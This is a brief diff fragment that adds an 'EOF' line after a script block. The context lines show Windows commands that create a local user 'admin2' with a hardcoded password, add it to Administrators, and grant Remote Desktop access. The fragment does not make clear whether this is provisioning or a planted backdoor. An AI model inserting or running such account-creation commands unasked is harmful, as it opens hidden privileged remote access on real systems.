@@ -84,4 +84,5 @@ net users admin2 Letmein2021 /add /passwordchg:yes
 net localgroup Administrators admin2 /add
 net localgroup "Remote Desktop Users" user2 /add
 </script>
+EOF
 }
